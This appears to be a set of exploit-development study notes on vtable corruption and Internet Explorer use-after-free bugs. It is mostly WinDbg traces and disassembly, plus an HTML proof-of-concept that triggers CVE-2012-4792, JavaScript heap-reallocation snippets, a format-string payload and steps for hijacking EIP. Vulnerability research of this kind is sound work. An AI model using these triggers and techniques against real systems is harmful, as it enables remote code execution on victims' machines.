# Vtables

### Overview

Before we get into weaponising UaFs and converting them into RCEs, we will need to understand the concept of virtual table functions. Many of the UaF articles will briefly share about virtual tables and how they can be hijacked to obtain RIP control and RCE. Easy and simple definition of vtables can be found on [stackoverflow](https://stackoverflow.com/questions/3554909/what-is-a-vtable-in-c). An equally simple PoC about how they can be hijacked can be found [here](https://defuse.ca/exploiting-cpp-vtables.htm) and [here](https://neilscomputerblog.blogspot.com/2013/02/attacking-v-table-pointers.html) (the windows equivalent should be trival to visualise). 

### [VTable Corruption](https://www.exploit-db.com/exploits/19131) via XM Easy Personal FTP Server 5.30

Here is a mini case study/analysis about a remote format string vulnerability, abused to create an arbitrary write primitive to obtain RCE via writing the virtual function tables. Another case study on how overflows were exploited in a similar fashion is seen in [Logic Print 2013](https://www.exploit-db.com/exploits/25835).

Static Analysis:

- 00406020 is where ABOR strings are used

- Sending USER, PASS, ABOR, all hits this address, probably some central command manager to receive FTP commands and process them

Dynamic Analysis

- If you send an ABOR string, it will go to 406139, if not it will skip that portion

- 0040606F->0040e4b0 is the next address to analyse

- Turns out, SendMessageA is the cause of the format string exploit at 0040e5c5

    ```
    0:002> g
    Breakpoint 0 hit
    eax=00221298 ebx=00aee840 ecx=00aeeb78 edx=00000001 esi=001b4c30 edi=00aee87c
    eip=0040e5c5 esp=00fadc90 ebp=001b29e0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ftpserver+0xe5c5:
    0040e5c5 ff152c764800    call    dword ptr [ftpserver+0x8762c (0048762c)] ds:0023:0048762c={USER32!SendMessageA (7e42f3c2)}
    0:002> dc poi(esp+0xc)
    00aeeb78  30303028 29313030 202d2009 746f6e28  (000001). - (not
    00aeeb88  676f6c20 20646567 09296e69 32393128   logged in).(192
    00aeeb98  3836312e 2e38352e 093e2931 52455355  .168.58.1)>.USER
    00aeeba8  6f6e6120 6f6d796e 00007375 00000000   anonymous......
    00aeebb8  00000000 00000001 0000000f 00000040  ............@...
    00aeebc8  32393128 3836312e 2e38352e 003e2931  (192.168.58.1)>.
    00aeebd8  7300296e 50544620 72655320 20726576  n).s FTP Server 
    00aeebe8  2e002e35 000a0030 00000000 00000000  5...0...........
    0:002> g
    Breakpoint 0 hit
    eax=00221298 ebx=00aee87c ecx=003c4ff0 edx=00000002 esi=001b4c30 edi=00aee87c
    eip=0040e5c5 esp=00fade98 ebp=00000000 iopl=0         nv up ei ng nz ac pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296
    ftpserver+0xe5c5:
    0040e5c5 ff152c764800    call    dword ptr [ftpserver+0x8762c (0048762c)] ds:0023:0048762c={USER32!SendMessageA (7e42f3c2)}
    0:002> dc poi(esp+0xc)
    003c4ff0  30303028 29313030 202d2009 746f6e28  (000001). - (not
    003c5000  676f6c20 20646567 09296e69 32393128   logged in).(192
    003c5010  3836312e 2e38352e 093e2931 20313333  .168.58.1)>.331 
    003c5020  73736150 64726f77 71657220 65726975  Password require
    003c5030  6f662064 6e612072 6d796e6f 0d73756f  d for anonymous.
    003c5040  5844000a 2073274d 20505446 76726553  ..DXM's FTP Serv
    003c5050  35207265 302e332e 00000000 00000000  er 5.3.0........
    003c5060  00000000 00000000 00000000 00000000  ................
    0:002> g
    Breakpoint 0 hit
    eax=00221298 ebx=00aee840 ecx=00aeeb28 edx=00000001 esi=001b4c30 edi=00aee87c
    eip=0040e5c5 esp=00fadc90 ebp=001b29e0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ftpserver+0xe5c5:
    0040e5c5 ff152c764800    call    dword ptr [ftpserver+0x8762c (0048762c)] ds:0023:0048762c={USER32!SendMessageA (7e42f3c2)}
    0:002> dc poi(esp+0xc)
    00aeeb28  30303028 29313030 202d2009 746f6e28  (000001). - (not
    00aeeb38  676f6c20 20646567 09296e69 32393128   logged in).(192
    00aeeb48  3836312e 2e38352e 093e2931 53534150  .168.58.1)>.PASS
    00aeeb58  6f6e6120 6f6d796e 00007375 00000000   anonymous......
    00aeeb68  00000000 00aeec5c 00000008 00000040  ....\.......@...
    00aeeb78  30303028 29313030 202d2000 746f6e28  (000001). - (not
    00aeeb88  676f6c20 20646567 09296e69 32393128   logged in).(192
    00aeeb98  3836312e 2e38352e 093e2931 52455300  .168.58.1)>..SER
    0:002> g
    Breakpoint 0 hit
    eax=00221298 ebx=00aee87c ecx=003c4ed0 edx=00000002 esi=001b4c30 edi=00aee87c
    eip=0040e5c5 esp=00fade98 ebp=00000000 iopl=0         nv up ei ng nz ac pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296
    ftpserver+0xe5c5:
    0040e5c5 ff152c764800    call    dword ptr [ftpserver+0x8762c (0048762c)] ds:0023:0048762c={USER32!SendMessageA (7e42f3c2)}
    0:002> dc poi(esp+0xc)
    003c4ed0  30303028 29313030 202d2009 6e6f6e61  (000001). - anon
    003c4ee0  756f6d79 31280973 312e3239 352e3836  ymous.(192.168.5
    003c4ef0  29312e38 3332093e 6c432030 746e6569  8.1)>.230 Client
    003c4f00  6e613a20 6d796e6f 2073756f 63637573   :anonymous succ
    003c4f10  66737365 796c6c75 676f6c20 20646567  essfully logged 
    003c4f20  202e6e69 65696c43 4920746e 313a2050  in. Client IP :1
    003c4f30  312e3239 352e3836 0d312e38 0000000a  92.168.58.1.....
    003c4f40  00000000 00000000 00000000 00000000  ................
    0:002> g
    Breakpoint 0 hit
    eax=00221298 ebx=00aee840 ecx=00aea348 edx=00000001 esi=001b4c30 edi=00aee87c
    eip=0040e5c5 esp=00fadc90 ebp=001b29e0 iopl=0         nv up ei ng nz ac pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000296
    ftpserver+0xe5c5:
    0040e5c5 ff152c764800    call    dword ptr [ftpserver+0x8762c (0048762c)] ds:0023:0048762c={USER32!SendMessageA (7e42f3c2)}
    0:002> dc poi(esp+0xc)
    00aea348  30303028 29313030 202d2009 6e6f6e61  (000001). - anon
    00aea358  756f6d79 31280973 312e3239 352e3836  ymous.(192.168.5
    00aea368  29312e38 4241093e 2520524f 256e256e  8.1)>.ABOR %n%n%
    00aea378  256e256e 256e256e 256e256e 256e256e  n%n%n%n%n%n%n%n%
    00aea388  256e256e 256e256e 256e256e 256e256e  n%n%n%n%n%n%n%n%
    00aea398  256e256e 256e256e 256e256e 256e256e  n%n%n%n%n%n%n%n%
    00aea3a8  256e256e 256e256e 256e256e 256e256e  n%n%n%n%n%n%n%n%
    00aea3b8  256e256e 256e256e 256e256e 256e256e  n%n%n%n%n%n%n%n%
    ```

- So we are sending the format string to the main window, which probably logs/displays it, there by causing the format string

- Looking at the callstack, 0043da26 (location of arbitrary write) returns to 004388fa is used by sprintf and vsprintf which confirms our suspicion. The window also logs the format string

    ```
    0:006> k
	0012fb3c 004388fa ftpserver+0x3da26
	0012fb74 00458637 ftpserver+0x388fa
    ```

- Now, we need to take a look at the vtable corruption, this is right after we sent ABOR (using analysis_just_dos)

    ```
    0:002> g
    Breakpoint 1 hit
    eax=00fadcd0 ebx=00aee628 ecx=00aee664 edx=00af3434 esi=00aee628 edi=00aee628
    eip=0040606f esp=00fadcbc ebp=001b2a00 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    ftpserver+0x606f:
    0040606f e83c840000      call    ftpserver+0xe4b0 (0040e4b0)
    0:002> bp 0045DAFD
    0:002> g
    Breakpoint 0 hit
    eax=00000000 ebx=00000000 ecx=00ae8d90 edx=00488db8 esi=00ae8d90 edi=004af318
    eip=0045dafd esp=0012feac ebp=004af318 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ftpserver+0x5dafd:
    0045dafd 56              push    esi
    0:000> g
    Breakpoint 0 hit
    eax=003c6f78 ebx=00000000 ecx=003c6f78 edx=00000000 esi=003c6f78 edi=004af318
    eip=0045dafd esp=0012feac ebp=004af318 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    ftpserver+0x5dafd:
    0045dafd 56              push    esi
    0:000> g
    Breakpoint 0 hit
    eax=00000000 ebx=004af318 ecx=00ae8680 edx=00488f08 esi=00ae8680 edi=00ae8680
    eip=0045dafd esp=0012fea8 ebp=004af318 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ftpserver+0x5dafd:
    0045dafd 56              push    esi
    0:000> g
    Breakpoint 0 hit
    eax=003c6f78 ebx=004af318 ecx=003c6f78 edx=00000000 esi=003c6f78 edi=00ae8680
    eip=0045dafd esp=0012fea8 ebp=004af318 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    ftpserver+0x5dafd:
    0045dafd 56              push    esi
    0:000> g
    Breakpoint 0 hit
    eax=003c6f78 ebx=004af318 ecx=00ae8680 edx=00000001 esi=000a11fe edi=00ae8680
    eip=0045dafd esp=0012feb0 ebp=004af318 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ftpserver+0x5dafd:
    0045dafd 56              push    esi
    0:000> g
    Breakpoint 0 hit
    eax=00000000 ebx=004af318 ecx=003c6f78 edx=00000000 esi=003c6f78 edi=00ae8680
    eip=0045dafd esp=0012feb0 ebp=004af318 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ftpserver+0x5dafd:
    0045dafd 56              push    esi
    0:000> g
    (9c4.b18): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=00b923e1 ebx=001562b8 ecx=003c6f78 edx=003c7774 esi=000004cc edi=003c6f78
    eip=0045c3af esp=0012fd00 ebp=0012fd58 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
    ftpserver+0x5c3af:
    0045c3af ff9098000000    call    dword ptr [eax+98h]  ds:0023:00b92479=????????
    ```

    - 0045dafd called 6 times before the call to the virtual function is made which causes the crash

    - Breakpoint for write: 0040606f, 0043DA26
    
    - Breakpoints for analysis: 0045dafd, 0045DB1F, 0045db23 / 0045C3A7, 0045C3A7, 0045c3af

        ```
        .text:0045DB1F mov     eax, [esi]
        .text:0045DB21 mov     ecx, esi
        .text:0045DB23 call    dword ptr [eax+0B0h]
        .text:0045DB29 test    eax, eax
        .text:0045DB2B jnz     short loc_

        .text:0045C3A4 push    dword ptr [ebp+18h]
        .text:0045C3A7 mov     eax, [edi]
        .text:0045C3A9 mov     ecx, edi
        .text:0045C3AB push    dword ptr [ebp+14h]
        .text:0045C3AE push    esi
        .text:0045C3AF call    dword ptr [eax+98h]
        ```

    ```
    Breakpoint 0 hit
    eax=010bdcd0 ebx=00aee628 ecx=00aee664 edx=00aea238 esi=00aee628 edi=00aee628
    eip=0040606f esp=010bdcbc ebp=001b44c8 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    ftpserver+0x606f:
    0040606f e83c840000      call    ftpserver+0xe4b0 (0040e4b0)
    0:002> bp 0045C3A7
    0:002> p
    Breakpoint 1 hit
    eax=00000000 ebx=001562b8 ecx=00c90236 edx=003c7764 esi=00000088 edi=003c6f40
    eip=0045c3a7 esp=0012fd08 ebp=0012fd58 iopl=0         nv up ei ng nz na pe cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287
    ftpserver+0x5c3a7:
    0045c3a7 8b07            mov     eax,dword ptr [edi]  ds:0023:003c6f40=00488a84
    0:000> dd 00488a84
    00488a84  004161d0 004163f0 00411f20 0047275e
    00488a94  0045cd2b 0045f634 0045f63a 0045f2d2
    00488aa4  0045f2d2 0045f63f 004161e0 0045f6d6
    00488ab4  0045f68c 0045f6d0 0045f698 0045f692
    00488ac4  0045f2d5 0045f63a 0045f63a 0045f63a
    00488ad4  0045cd2a 0045cb32 0045cd3c 00416960
    00488ae4  0045e21f 0045ce4a 0045f63a 0045d2ef
    00488af4  0045ef38 0045ef3f 00471dbc 0045da83
    0:000> k
    ChildEBP RetAddr  
    WARNING: Stack unwind information not available. Following frames may be wrong.
    0012fd58 0045c5d0 ftpserver+0x5c3a7
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\system32\USER32.dll - 
    0012fd78 7e418734 ftpserver+0x5c5d0
    0012fda4 7e418816 USER32!GetDC+0x6d
    0012fe0c 7e428ea0 USER32!GetDC+0x14f
    0012fe60 7e428eec USER32!DefWindowProcW+0x180
    0012fe88 7c90e473 USER32!DefWindowProcW+0x1cc
    0012feac 7e4191be ntdll!KiUserCallbackDispatcher+0x13
    0012fed4 004610a0 USER32!GetProcessWindowStation+0x29
    0012fef0 00460be8 ftpserver+0x610a0
    0012ff08 00462946 ftpserver+0x60be8
    00000000 00000000 ftpserver+0x62946
    ```

    - Most likely what happens is that SendMessageA results in the calling of sub_45C59C to handle the ABOR request

    ```
    0:000> g
    Breakpoint 1 hit
    eax=003c6f40 ebx=004af318 ecx=003c76b4 edx=00000000 esi=003c6f40 edi=7e42910f
    eip=0045db1f esp=0012fea0 ebp=004af318 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    ftpserver+0x5db1f:
    0045db1f 8b06            mov     eax,dword ptr [esi]  ds:0023:003c6f40=00b923e1
    0:000> dd 00487b40
    00487b40  00476920 00401c40 00411f20 0045f525
    00487b50  0045cd2b 0045f634 0045f63a 0045f2d2
    00487b60  0045f2d2 0045f63f 00468a01 0045f6d6
    00487b70  0045f68c 0045f6d0 0045f698 0045f692
    00487b80  0045f2d5 0045f63a 0045f63a 0045f63a
    00487b90  0045cd2a 0045cb32 0045cd3c 0045cb12
    00487ba0  0045e21f 0045ce4a 0045f63a 0045d2ef
    00487bb0  0045ef38 0045ef3f 0046adcd 0046ae07
    0:000> dd 00b923e1
    00b923e1  ???????? ???????? ???????? ????????
    00b923f1  ???????? ???????? ???????? ????????
    00b92401  ???????? ???????? ???????? ????????
    00b92411  ???????? ???????? ???????? ????????
    00b92421  ???????? ???????? ???????? ????????
    00b92431  ???????? ???????? ???????? ????????
    00b92441  ???????? ???????? ???????? ????????
    00b92451  ???????? ???????? ???????? ????????
    0:000> dd eax
    003c6f40  00b923e1 00000001 00000000 00000000
    003c6f50  00000000 00000001 00000000 00ca0236
    003c6f60  00000000 00000000 7e42c17e 00000000
    003c6f70  00000000 00000000 00000000 00000001
    003c6f80  00000000 013e0783 001208bb 00000000
    003c6f90  00000000 00000000 00000000 00000000
    003c6fa0  00000000 00000000 00000000 0048fdf0
    003c6fb0  00ae91b4 00ae91f0 00000006 00ae91fc
    ```

    ```
    0:002> g
    Breakpoint 1 hit
    eax=003c6f40 ebx=0000006e ecx=00b923e1 edx=00000200 esi=00af8708 edi=00000800
    eip=0043da26 esp=0012f8e4 ebp=0012fb3c iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ftpserver+0x3da26:
    0043da26 8908            mov     dword ptr [eax],ecx  ds:0023:003c6f40=00488a84
    0:000> bp 0045db1f
    0:000> g
    (cb4.fec): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=00b923e1 ebx=001562b8 ecx=003c6f40 edx=003c7764 esi=00000088 edi=003c6f40
    eip=0045c3af esp=0012fd00 ebp=0012fd58 iopl=0         nv up ei ng nz na pe cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010287
    ftpserver+0x5c3af:
    0045c3af ff9098000000    call    dword ptr [eax+98h]  ds:0023:00b92479=????????
    0:000> dd 003c6f40
    003c6f40  00b923e1 00000001 00000000 00000000
    003c6f50  00000000 00000001 00000000 00cb0236
    003c6f60  00000000 00000000 7e42c17e 00000000
    003c6f70  00000000 00000000 00000000 00000001
    003c6f80  00000000 040b0573 00150915 00000000
    003c6f90  00000000 00000000 00000000 00000000
    003c6fa0  00000000 00000000 00000000 0048fdf0
    003c6fb0  00ae91b4 00ae91f0 00000006 00ae91fc
    ```

    - We observe that indeed, our initial write causes the crash

    - Can't seem to consistently get the program to crash a certain call, as there are 2: 0045dafd, 0045DB1F, 0045db23 / 0045C3A7, 0045C3A7, 0045c3af

# Windows Use-After-Frees

### Overview

Allocate space in heap when we create an Object. Object's virtual functions are organised and stored in a virtual table. When we delete/free the object in the heap and then proceed to "use" the object's function, this will lead to a memory access violation as the vtable has already been cleared during the free, which where the use-after-free vulnerability gets its name from. Using windbg and `!heap -p -a`, we can identify the location of the object in the heap and the amount of space it uses. We can then intentionally "use" this free space and fill it with an attacker controlled buffer, to convert the uaf into RCE. We can attempt to use a Precision Heap Spray and spray the lower sections of the heap with our shellcode which bypasses DEP, and as for our buffer, we can insert a fake virtual table filled with "0x0x0x0x"s which will allow us to pivot into our shellcode. We can alternatively use the [precise reallocation with HTML+TIME](https://blog.exodusintel.com/2013/01/02/happy-new-year-analysis-of-cve-2012-4792/) technique but note that this technique only works on IE8 but is extremely reliable as it allows us to allocate pointers to our shellcode.

### Steps to Hijack EIP/RIP

1. "Use" up the freed space, needs to match the exact size of the freed space

2. Disable page heap

3. Run the PoC to crash the application

4. Use `!heap -p -a @reg`

5. "Fill" up the space, on IE8, we can do one of the following:

    - ```
      // space to fill: 0x38
      var fillalloc = "\u4141\u4141"
      while (fillalloc.length < ((0x38-0x4)/2)) fillalloc += "\u4141\u4141"
      for (var i = 0; i < 0x20; i++) {
       	div = document.createElement("div")
       	div.className = fillalloc
      }
      ```

    - ```
      // space to fill: 0x38
      for (var i = 0; i < 0x20; i++) {
        div = document.createElement("div")
        div.className = "\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141"+
                        "\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141"+
                        "\u4141\u4141\u4141\u4141\u4141\u4141\u4141"
      }
      ```

    - ```
      // space to fill: 0x68
      var fillalloc = "\u4242\u4242"
	  for (var i = 0; i < ((0x68-4)/4)-1; i++) {
	   	fillalloc += "\u4141\u4141";
	  }
	  // fillalloc.length is 50, which is 50*2=100 (0x68-4)
	  var obj = document.createElement('img');
	  obj.title = fillalloc;
      ```

6. After we "fill" up the space, we can set the address to some 0x0y0y0y0y

7. On IE8, we can abuse a `HTML+TIME` feature

### CVE-2012-4792 IE CButton Object

```
<!doctype html>
<html>
<head>
    <script>
    function helloWorld() {
        var e0 = null;
        var e1 = null;
        var e2 = null;

        try {
            e0 = document.getElementById("a");
            e1 = document.getElementById("b");
            e2 = document.createElement("q");
            e1.applyElement(e2);
            e1.appendChild(document.createElement('button'));
            e1.applyElement(e0);
            e2.outerText = "";
            e2.appendChild(document.createElement('body'));
        } catch(e) { }
        CollectGarbage();
        var eip = window;
        var data = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        eip.location = unescape("AA" + data);
    }

    </script>
</head>
<body onload="eval(helloWorld())">
    <form id="a">
    </form>
    <dfn id="b">
    </dfn>
</body>
</html>

(a0.3c0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=05682fa8 ebx=04db8f28 ecx=00000052 edx=00000000 esi=00000000 edi=05682fa8
eip=3d08625c esp=0336d7a0 ebp=0336d80c iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
mshtml!CMarkup::OnLoadStatusDone+0x4ef:
3d08625c 8b07            mov     eax,dword ptr [edi]  ds:0023:05682fa8=????????
1:022> !heap -p -a edi
    address 05682fa8 found in
    _DPH_HEAP_ROOT @ 151000
    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
                                    5640eb0:          5682000             2000
    7c91a1ba ntdll!RtlFreeHeap+0x000000f9
    3d2b4b10 mshtml!CButton::`vector deleting destructor'+0x0000002f
    3cfa0ad9 mshtml!CBase::SubRelease+0x00000022
    3cf7e76d mshtml!CElement::PrivateRelease+0x00000029
    3cf7a976 mshtml!PlainRelease+0x00000025
    3cf9709c mshtml!PlainTrackerRelease+0x00000014
    3d7b5194 jscript!VAR::Clear+0x0000005c
    3d7b55b9 jscript!GcContext::Reclaim+0x000000ab
    3d7b4d08 jscript!GcContext::CollectCore+0x00000113
    3d82471d jscript!JsCollectGarbage+0x0000001d
    3d7c4aac jscript!NameTbl::InvokeInternal+0x00000137
    3d7c28c5 jscript!VAR::InvokeByDispID+0x0000017c
    3d7c4f93 jscript!CScriptRuntime::Run+0x00002abe
    3d7c13ab jscript!ScrFncObj::CallWithFrameOnStack+0x000000ff
    3d7c12e5 jscript!ScrFncObj::Call+0x0000008f
    3d7c1113 jscript!CSession::Execute+0x00000175

1:022> kv
ChildEBP RetAddr  Args to Child
0336d80c 3cee3e45 04f38fc0 04df06bc 04df06a8 mshtml!CMarkup::OnLoadStatusDone+0x4ef
0336d82c 3cee3e21 00000004 0336dcb4 00000001 mshtml!CMarkup::OnLoadStatus+0x47
0336dc78 3cf50aef 04f3af48 00000000 00000000 mshtml!CProgSink::DoUpdate+0x52f
0336dc8c 3cf8a7e9 04f3af48 04f3af48 04d9cd58 mshtml!CProgSink::OnMethodCall+0x12
0336dcc0 3cf75488 0336dd48 3cf753da 00000000 mshtml!GlobalWndOnMethodCall+0xfb
0336dce0 7e418734 0007025e 00000009 00000000 mshtml!GlobalWndProc+0x183
0336dd0c 7e418816 3cf753da 0007025e 00008002 USER32!InternalCallWinProc+0x28
0336dd74 7e4189cd 00000000 3cf753da 0007025e USER32!UserCallWinProcCheckWow+0x150 (FPO: [Non-Fpo])
0336ddd4 7e418a10 0336de08 00000000 0336feec USER32!DispatchMessageWorker+0x306 (FPO: [Non-Fpo])
0336dde4 3e2ec1d5 0336de08 00000000 01f9cf58 USER32!DispatchMessageW+0xf (FPO: [Non-Fpo])
0336feec 3e2932ee 030ecfe0 01000002 03070ff0 IEFRAME!CTabWindow::_TabWindowThreadProc+0x54c (FPO: [Non-Fpo])
0336ffa4 3e136f69 01f9cf58 0015476c 0336ffec IEFRAME!LCIETab_ThreadProc+0x2c1 (FPO: [Non-Fpo])
0336ffb4 7c80b729 03070ff0 01000002 0015476c iertutil!CIsoScope::RegisterThread+0xab (FPO: [Non-Fpo])
0336ffec 00000000 3e136f5b 03070ff0 00000000 kernel32!BaseThreadStart+0x37 (FPO: [Non-Fpo])
```

- Create CButton Object

- Free CButton Object

- `mshtml!CMarkup::OnLoadStatusDone+0x4ef` uses freed CButton Object triggering the UaF

- CElement::FindDefaultElem returns CButton element after it has been freed 

- Set breakpoint at `CMarkup::OnLoadStatusDone+0x4dc` since it comes after CElement::FindDefaultElem and we want to see the address of our CButton Object. Do not set it at `CElement::FindDefaultElem` itself as it is called multiple times

```
0:000> sxe ld:mshtml
0:000> g
ModLoad: 3cea0000 3d45e000   C:WINDOWSsystem32mshtml.dll
1:025> bp !mshtml + 0x414c27 ".printf "Created CButton at %p", eax;.echo;g"
1:025> bp !mshtml + 0x414ae1 ".printf "Deleting CButton at %p", ecx;.echo;g"
1:025> bp !mshtml + 0x44224
1:025> bl
 0 e 3d2b4c27     0001 (0001)  1:**** mshtml!CButton::CreateElement+0x16 ".printf "Created CButton at %p", eax;.echo;g"
 1 e 3d2b4ae1     0001 (0001)  1:**** mshtml!CButton::`vector deleting destructor' ".printf "Deleting CButton at %p", ecx;.echo;g"
 2 e 3cee4224     0001 (0001)  1:**** mshtml!CMarkup::OnLoadStatusDone+0x4dc
1:025> g
Created CButton at 055eefa8
Deleting CButton at 055eefa8
Breakpoint 2 hit
3cee4224 e80bc30100      call    mshtml!CElement::FindDefaultElem (3cf00534)
==== Step inside mshtml!CElement::FindDefaultElem ====
3cf00585 56              push    esi
3cf00586 8bc3            mov     eax,ebx
3cf00588 e84aa20400      call    mshtml!CElement::GetParentForm (3cf4a7d7)
3cf0058d 8bf0            mov     esi,eax
3cf0058f 3bf2            cmp     esi,edx
3cf00591 0f857e4d1a00    jne     mshtml!CElement::FindDefaultElem+0x57 (3d0a5315) [br=0]
3cf00597 395510          cmp     dword ptr [ebp+10h],edx ss:0023:0336d79c=00000000
3cf0059a 0f8569a71f00    jne     mshtml!CElement::FindDefaultElem+0x79 (3d0fad09) [br=0]
==== Step until mshtml!CElement::FindDefaultElem+0x96 ====
eax=00000000 ebx=052dafd0 ecx=00000052 edx=00000000 esi=00000000 edi=04c1a6a8
eip=3cf005a0 esp=0336d780 ebp=0336d78c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
mshtml!CElement::FindDefaultElem+0x96:
3cf005a0 8b87a8010000    mov     eax,dword ptr [edi+1A8h] ds:0023:04c1a850=055eefa8
1:025> dc 04c1a6a8 // this will be in the eax value
04c1a6a8  3cfa4f78 00000014 000000b8 00000000  xO.<............
04c1a6b8  00000000 3cf46c50 04c1a6a8 021e1b8c  ....Pl. 
dds 04c1a6a8 L1
04c1a6a8  3cfa4f78 // this should be the mshtml!CDoc::`vftable`
1:025> !heap -p -a 04c1a6a8
    address 04c1a6a8 found in
    _DPH_HEAP_ROOT @ 151000
    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                                 44cad98:          4c1a6a8              954 -          4c1a000             2000
    mshtml!CDoc::`vftable'
    7c919c0c ntdll!RtlAllocateHeap+0x00000e64
    3ceb29f0 mshtml!CDoc::operator new+0x00000013
    3cebd2e8 mshtml!CBaseCF::CreateInstance+0x0000007b
    3e284da3 IEFRAME!CBaseBrowser2::_OnCoCreateDocument+0x0000005f
    3e284d44 IEFRAME!CBaseBrowser2::_ExecExplorer+0x00000073
    3e2eca2e IEFRAME!CBaseBrowser2::Exec+0x0000012d
    3e2ecec8 IEFRAME!CShellBrowser2::_Exec_CCommonBrowser+0x00000080
    3e2ecef7 IEFRAME!CShellBrowser2::Exec+0x00000626
    3e284b53 IEFRAME!CDocObjectHost::_CoCreateHTMLDocument+0x0000004e
    3e284ae7 IEFRAME!CDocObjectHost::_CreatePendingDocObject+0x0000002c
    3e28320a IEFRAME!CDocObjectHost::CDOHBindStatusCallback::_ProcessCLASSIDBindStatus+0x000000c5
    3e283d17 IEFRAME!CDocObjectHost::CDOHBindStatusCallback::_ProcessSecurityBindStatus+0x000000b2
    3e282d1d IEFRAME!CDocObjectHost::CDOHBindStatusCallback::OnProgress+0x000000a5
    781362f7 urlmon!CBSCHolder::OnProgress+0x0000003c
    78136247 urlmon!CBinding::CallOnProgress+0x00000030
    7816180b urlmon!CBinding::InstantiateObject+0x000000b7
==== Step until the end of the function ====
1:025> p
3cf005a6 5e              pop     esi
3cf005a7 5f              pop     edi
3cf005a8 5b              pop     ebx
3cf005a9 5d              pop     ebp
3cf005aa c20c00          ret     0Ch
```

- CButton still being referenced by CDoc element

- Set breakpoint at end of `mshtml!CDoc::operator new`

- We see that 04c1a6a8 is returned into EAX

- Basically, there is a reference of the freed CButton in CDoc, after garbage is collected。 When the OnLoad function is completed,  OnLoadStatusDone() is called which uses the CButton reference.

- Find CButton size using `mshtml!CButton::CreateElement` (0x58) / or simply use `!heap -p -a REG` to see the size of the object whose vtable is being referenced for virtual functions

- PageHeap MUST be disabled during exploitation

References:

- [Exploit pop calc.exe](https://github.com/WizardVan/CVE-2012-4792)

- [Exploit by Exodus](https://blog.exodusintel.com/2013/01/02/happy-new-year-analysis-of-cve-2012-4792/)

- [Paper on no-heap-spray method](https://www.pkuexploit.com/files/paper48.pdf)

- [Analysis from tencent](https://cloud.tencent.com/developer/article/1818289)

- [Analysis from cnblogs](https://www.cnblogs.com/Lamboy/p/3879089.html)

### CVE-2013-3163 IE CAnchorElement

Vulnerability arises from `<q>` comes after a `<tr>`

- Must have a Table, then a TableRow, then a Div/Legend, then a Span, then a Phrase, then an Anchor, then a Table element

- Free the Phrase element, but the Anchor element is still somehow referenced, due to poor management of DOM tree as per [researcher's discovery slides](https://speakerd.s3.amazonaws.com/presentations/0df98910d26c0130e8927e81ab71b214/for-share.pdf)

References:

- https://connormcgarr.github.io/browser1/


### CVE-2013-1347 IE CGenericElement

Did not do any RCA/exploit analysis, just focused on controlling EIP via the UaF vulnerability.

```
// 0:005> u eip-2
// mshtml!Ordinal104+0x4b0ee:
// 6b2db68d 8b01            mov     eax,dword ptr [ecx]
// 6b2db68f 8b5070          mov     edx,dword ptr [eax+70h]
// 6b2db692 ffd2            call    edx
// 6b2db694 8b400c          mov     eax,dword ptr [eax+0Ch]
// address 015d09e8 found in
// _HEAP @ 1520000
//   HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
//     015d09c0 000e 0000  [00]   015d09e8    00038 - (free DelayedFree)
// srv*C:\symbols*http://msdl.microsoft.com/download/symbols
```

- Space to allocate is 0x38 bytes

References:

- [Analysis by exp-sky](https://github.com/exp-sky/Blog/blob/master/CVE-2013-1347_Analysis/CVE-2013-1347_Analysis.md)

- [Metasploit PoC on exploitdb](https://www.exploit-db.com/exploits/25294)


### CVE-2013-3893 IE SetMouseCapture

Did not do any RCA/exploit analysis, just focused on controlling EIP via the UaF vulnerability.

References:

